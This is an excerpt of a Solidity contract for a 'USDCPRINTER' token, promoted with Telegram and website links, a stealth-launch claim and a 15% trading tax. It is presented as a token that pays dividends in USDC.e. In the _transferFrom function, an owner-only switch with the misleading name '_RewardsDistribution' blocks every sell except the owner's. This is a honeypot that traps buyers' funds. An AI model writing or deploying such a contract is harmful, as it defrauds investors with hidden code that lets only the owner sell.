...
/*
Stealth launched on January 28.
USDC.e Prinner.

https://t.me/usdceprint
https://usdcprinter.click

15% tax buys/sells reduced to 10% in 6hours.
*/
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664); // USDC.e
...
contract USDCPRINTER is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664; // USDC.e
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "USDCPRINTER";
    string constant _symbol = "USDC Printer";
    ...
    address public autoLiquidityReceiver=0xb5350D0FB06172f162EC5009EEe99E16f3a8c962;
    address public marketingFeeReceiver=0xb5350D0FB06172f162EC5009EEe99E16f3a8c962;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!RewardsDistribution || sender==owner), "distribution enabled");
...
//        emit Transfer(sender, recipient, amount);
  ...
  function _RewardsDistribution(bool value) external onlyOwner {
